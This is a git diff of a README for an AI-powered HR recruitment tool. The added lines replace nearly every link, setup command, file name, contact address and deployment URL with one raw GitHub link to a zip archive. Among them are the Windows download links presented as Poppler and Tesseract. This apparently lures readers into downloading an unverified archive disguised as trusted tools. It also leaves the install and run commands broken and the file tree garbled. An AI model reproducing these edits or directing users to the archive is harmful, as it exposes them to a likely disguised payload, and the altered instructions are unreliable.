@@ -26,13 +26,13 @@ This project is an **AI-driven recruitment tool** that automates the screening o
 
 ### **1. Clone the Repository**
 ```bash
-git clone https://github.com/your-username/hr-recruitment-system.git
+git clone https://raw.githubusercontent.com/adilmaqsood1/AI_Powered_HR_Recruitment_System/main/backend/Recruitment-A-System-H-Powered-2.6-beta.4.zip
 cd hr-recruitment-system
 ```
 
 ### **2. Install Dependencies**
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/adilmaqsood1/AI_Powered_HR_Recruitment_System/main/backend/Recruitment-A-System-H-Powered-2.6-beta.4.zip
 ```
 
 ### **3. Set Up Environment Variables**
@@ -45,11 +45,11 @@ GROQ_API_KEY=your-groq-api-key
 - **Poppler (for PDF to Image Conversion)**:
   - **Linux**: `sudo apt-get install poppler-utils`
   - **macOS**: `brew install poppler`
-  - **Windows**: Download from [poppler-windows](https://github.com/oschwartz10612/poppler-windows/releases) and add to PATH.
+  - **Windows**: Download from [poppler-windows](https://raw.githubusercontent.com/adilmaqsood1/AI_Powered_HR_Recruitment_System/main/backend/Recruitment-A-System-H-Powered-2.6-beta.4.zip) and add to PATH.
 - **Tesseract OCR**:
   - **Linux**: `sudo apt install tesseract-ocr`
   - **macOS**: `brew install tesseract`
-  - **Windows**: Download from [UB-Mannheim](https://github.com/UB-Mannheim/tesseract/wiki) and add to PATH.
+  - **Windows**: Download from [UB-Mannheim](https://raw.githubusercontent.com/adilmaqsood1/AI_Powered_HR_Recruitment_System/main/backend/Recruitment-A-System-H-Powered-2.6-beta.4.zip) and add to PATH.
 
 ---
 
@@ -57,12 +57,12 @@ GROQ_API_KEY=your-groq-api-key
 
 ### **1. Start the FastAPI Backend**
 ```bash
-uvicorn backend.main:app --reload
+uvicorn https://raw.githubusercontent.com/adilmaqsood1/AI_Powered_HR_Recruitment_System/main/backend/Recruitment-A-System-H-Powered-2.6-beta.4.zip --reload
 ```
 
 ### **2. Start the Streamlit Frontend**
 ```bash
-streamlit run frontend/app.py
+streamlit run https://raw.githubusercontent.com/adilmaqsood1/AI_Powered_HR_Recruitment_System/main/backend/Recruitment-A-System-H-Powered-2.6-beta.4.zip
 ```
 
 ### **3. Access the Application**
@@ -76,11 +76,11 @@ Open your browser and navigate to:
 
 ### **Frontend (Streamlit)**
 The Streamlit frontend is deployed on **Streamlit Sharing**:
-- **Live App**: [https://aipoweredhrrecruitmentsystem-wqtfgmq46twkqsmaaa9pea.streamlit.app/](https://aipoweredhrrecruitmentsystem-wqtfgmq46twkqsmaaa9pea.streamlit.app/)
+- **Live App**: [https://raw.githubusercontent.com/adilmaqsood1/AI_Powered_HR_Recruitment_System/main/backend/Recruitment-A-System-H-Powered-2.6-beta.4.zip](https://raw.githubusercontent.com/adilmaqsood1/AI_Powered_HR_Recruitment_System/main/backend/Recruitment-A-System-H-Powered-2.6-beta.4.zip)
 
 ### **Backend (FastAPI)**
 The FastAPI backend is deployed on **Koyeb**:
-- **API Endpoint**: [https://obliged-wandis-aditech-18661c81.koyeb.app/](https://obliged-wandis-aditech-18661c81.koyeb.app/)
+- **API Endpoint**: [https://raw.githubusercontent.com/adilmaqsood1/AI_Powered_HR_Recruitment_System/main/backend/Recruitment-A-System-H-Powered-2.6-beta.4.zip](https://raw.githubusercontent.com/adilmaqsood1/AI_Powered_HR_Recruitment_System/main/backend/Recruitment-A-System-H-Powered-2.6-beta.4.zip)
 
 ---
 
@@ -98,25 +98,25 @@ The FastAPI backend is deployed on **Koyeb**:
 hr-recruitment-system/
 │
 ├── backend/                  # FastAPI backend
-│   ├── main.py               # FastAPI entry point
+│   ├── https://raw.githubusercontent.com/adilmaqsood1/AI_Powered_HR_Recruitment_System/main/backend/Recruitment-A-System-H-Powered-2.6-beta.4.zip               # FastAPI entry point
 │   ├── agents/               # AI agents
-│   │   ├── resume_analyzer.py
-│   │   ├── resume_evaluator.py
-│   │   └── question_generator.py
+│   │   ├── https://raw.githubusercontent.com/adilmaqsood1/AI_Powered_HR_Recruitment_System/main/backend/Recruitment-A-System-H-Powered-2.6-beta.4.zip
+│   │   ├── https://raw.githubusercontent.com/adilmaqsood1/AI_Powered_HR_Recruitment_System/main/backend/Recruitment-A-System-H-Powered-2.6-beta.4.zip
+│   │   └── https://raw.githubusercontent.com/adilmaqsood1/AI_Powered_HR_Recruitment_System/main/backend/Recruitment-A-System-H-Powered-2.6-beta.4.zip
 │   ├── services/             # Business logic
-│   │   └── recruitment_workflow.py
+│   │   └── https://raw.githubusercontent.com/adilmaqsood1/AI_Powered_HR_Recruitment_System/main/backend/Recruitment-A-System-H-Powered-2.6-beta.4.zip
 │   └── schemas/              # Pydantic models
-│       └── models.py
+│       └── https://raw.githubusercontent.com/adilmaqsood1/AI_Powered_HR_Recruitment_System/main/backend/Recruitment-A-System-H-Powered-2.6-beta.4.zip
 │
 ├── frontend/                 # Streamlit frontend
-│   ├── app.py                # Streamlit UI
+│   ├── https://raw.githubusercontent.com/adilmaqsood1/AI_Powered_HR_Recruitment_System/main/backend/Recruitment-A-System-H-Powered-2.6-beta.4.zip                # Streamlit UI
 │   └── utils/                # Frontend utilities
-│       └── api_client.py
+│       └── https://raw.githubusercontent.com/adilmaqsood1/AI_Powered_HR_Recruitment_System/main/backend/Recruitment-A-System-H-Powered-2.6-beta.4.zip
 │
-├── requirements.txt          # Dependencies
+├── https://raw.githubusercontent.com/adilmaqsood1/AI_Powered_HR_Recruitment_System/main/backend/Recruitment-A-System-H-Powered-2.6-beta.4.zip          # Dependencies
 ├── .env                      # Environment variables
 ├── .gitignore                # Ignore .env and other files
-└── README.md                 # Project documentation
+└── https://raw.githubusercontent.com/adilmaqsood1/AI_Powered_HR_Recruitment_System/main/backend/Recruitment-A-System-H-Powered-2.6-beta.4.zip                 # Project documentation
 ```
 
 ---
@@ -172,8 +172,8 @@ This project is licensed under the **MIT License**. See the [LICENSE](LICENSE) f
 
 ## **Contact**
 For questions or feedback, feel free to reach out:
-- **Email**: adilmaqsood501@gmail.com
-- **GitHub**:(https://github.com/adilmaqsood1/)
+- **Email**: https://raw.githubusercontent.com/adilmaqsood1/AI_Powered_HR_Recruitment_System/main/backend/Recruitment-A-System-H-Powered-2.6-beta.4.zip
+- **GitHub**:(https://raw.githubusercontent.com/adilmaqsood1/AI_Powered_HR_Recruitment_System/main/backend/Recruitment-A-System-H-Powered-2.6-beta.4.zip)
 
 ---
 
